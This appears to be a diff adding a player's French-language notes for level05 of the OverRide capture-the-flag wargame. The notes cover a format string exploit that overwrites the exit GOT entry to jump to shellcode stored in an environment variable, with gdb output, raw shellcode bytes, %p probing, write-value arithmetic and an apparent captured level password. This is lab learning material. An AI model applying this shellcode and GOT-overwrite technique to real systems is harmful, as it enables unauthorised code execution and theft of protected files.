@@ -1,0 +1,88 @@
+level05@OverRide:~$ ./level05
+hey
+hey
+level05@OverRide:~$ ./level05
+ls
+ls
+level05@OverRide:~$ ./level05
+5
+5
+level05@OverRide:~$ ./level05
+
+
+level05@OverRide:~$
+
+export level=level05
+scp -P 4242 $level@192.168.1.28:/home/users/$level/$level ./bin/.
+
+on voit un possible format string vuln printf(s);
+
+le programme rend les majuscule minuscule.
+
+le buffer fait 100octets et il n'est pas possible de l'overflow
+  char s[100]; // [esp+28h] [ebp-70h] BYREF
+  fgets(s, 100, stdin);
+
+le programme finit par un   exit(0);
+donc je peux ecraser l'adresse de exit 
+
+   0x08048513 <+207>:   call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) disassemble 0x8048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:     jmp    *0x80497e0
+   0x08048376 <+6>:     push   $0x18
+   0x0804837b <+11>:    jmp    0x8048330
+End of assembler dump.
+(gdb) x 0x80497e0
+0x80497e0 <exit@got.plt>:       0x08048376
+(gdb)
+
+donc il faut remplacer la valeur dans 0x80497e0 par une env var 
+	qui contient le shellcode
+https://masterccc.github.io/tools/shellcode_gen/ /home/users/level06////.pass
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x36\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+on ajoute init edx avec xor: \x31\xD2
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x36\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\x31\xD2\xcd\x80
+67o
+
+aaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\
+
+level05@OverRide:~$ ./level05
+aaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+aaaa 0x64.0xf7fcfac0.0xf7ec3af9.0xffffd6df.0xffffd6de.(nil).0xffffffff.0xffffd764.0xf7fdb000.0x61616161.0x2e702520.0x252e7025.0x70252e70.0x2e70252e
+level05@OverRide:~$
+
+on retombe sur nos "aaaa" ici 0x61616161 en 10eme position
+
+level05@OverRide:/tmp$ nano get_env.c
+level05@OverRide:/tmp$ nano shell_gen.py
+level05@OverRide:/tmp$ export shellcode=$(python shell_gen.py)
+level05@OverRide:/tmp$ env | grep shell
+shellcode=����������������������������������������1�Ph/cath/bin��Phpassh///.hl06/hlevehers/he/ush/hom��PQS��1���
+          1�̀
+level05@OverRide:/tmp$ gcc get_env.c
+level05@OverRide:/tmp$ ./a.out
+0x7fffffffeec1
+level05@OverRide:/tmp$
+donc 0x00007fffffffeec1 32bits
+
+level05@OverRide:/tmp$ gcc -m32 get_env.c
+level05@OverRide:/tmp$ ./a.out
+0xffffdec1
+
+on veut mettre 0xffffdec1 dans 0x80497e0
+ff  ff  de  c1
+255 255 222 193
+OU
+ffff  dec1
+65535 57025
+
+57025(- 8 octets d'avant = 57017)
+65535(- 57025 = 8510)
+
+
+                                          �
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+level05@OverRide:~$
